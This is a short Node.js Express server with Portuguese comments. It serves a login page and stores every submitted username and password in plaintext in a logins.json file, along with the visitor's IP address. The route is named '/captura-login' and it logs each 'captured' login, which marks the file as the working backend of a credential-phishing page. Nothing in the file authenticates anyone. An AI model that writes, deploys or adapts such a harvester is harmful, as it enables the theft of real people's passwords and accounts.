const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Utilitário de log com horário
const log = (msg) => {
  const now = new Date().toLocaleTimeString("pt-BR");
  console.log(`[${now}] ${msg}`);
};

// Rota de captura de login
app.post("/captura-login", (req, res) => {
  const { usuario, senha } = req.body;

  if (!usuario || !senha) {
    log("❌ Tentativa de login inválida: campos vazios.");
    return res.status(400).json({ erro: "Usuário e senha são obrigatórios." });
  }

  const dados = {
    usuario,
    senha,
    ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
    data: new Date().toISOString()
  };

  const caminho = path.join(__dirname, "logins.json");
  let lista = [];

  if (fs.existsSync(caminho)) {
    try {
      lista = JSON.parse(fs.readFileSync(caminho));
    } catch (erro) {
      log("⚠️ Erro ao ler logins.json, criando novo arquivo.");
    }
  }

  lista.push(dados);

  fs.writeFileSync(caminho, JSON.stringify(lista, null, 2));

  log(`✅ Login capturado: ${usuario} | IP: ${dados.ip}`);
  res.status(200).json({ status: "ok" });
});

// Rota fallback para login.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "login.html"));
});

// Iniciar servidor
app.listen(PORT, () => {
  log(`🚀 Servidor rodando em http://localhost:${PORT}`);
});
